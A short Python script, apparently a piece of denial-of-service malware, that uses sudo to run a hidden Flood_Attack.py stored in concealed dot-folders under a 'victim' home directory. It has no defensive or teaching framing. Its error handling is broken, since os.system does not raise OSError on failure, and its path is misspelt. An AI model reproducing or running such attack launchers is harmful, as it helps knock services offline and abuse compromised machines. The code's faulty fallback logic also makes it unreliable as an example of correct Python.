import os


def launch_attack():
    try:
        os.system('sudo /usr/bin/python /homo/victim/.etc/.module/Flood_Attack.py')
    except OSError as e:
        print(e)

        try:
            os.system('sudo /usr/bin/python /homo/victim/.var/.module/Flood_Attack.py')
        except OSError as e:
            print(e)

    return


if __name__ == '__main__':
    launch_attack()
